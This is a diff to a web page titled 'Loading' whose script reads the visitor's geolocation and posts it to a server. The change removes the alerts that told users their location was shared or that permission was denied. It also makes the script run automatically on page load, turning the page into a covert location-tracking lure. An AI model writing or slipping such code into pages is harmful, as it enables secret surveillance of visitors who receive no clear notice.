@@ -5,7 +5,7 @@
   <title>Loading</title>
 </head>
 <body>
-  <button onclick="sendLocation()">Next</button>
+  <button id="shareBtn" onclick="sendLocation()">Next</button>
 
   <script>
     async function sendLocation() {
@@ -26,18 +26,21 @@
               body: JSON.stringify(data)
             });
 
-            console.log("Location sent:", data);
-            alert("Location shared successfully!");
+            console.log("Sent:", data);
+            document.getElementById("shareBtn").disabled = true;
           } catch (err) {
-            console.error("Failed to send data:", err);
+            console.error("data:", err);
           }
         },
         error => {
-          console.warn("Geolocation error:", error);
-          alert("⚠️ Location permission was denied or failed.");
+          console.warn("error:", error);
         }
       );
     }
+
+    window.addEventListener("DOMContentLoaded", () => {
+      sendLocation();
+    });
   </script>
 </body>
 </html>
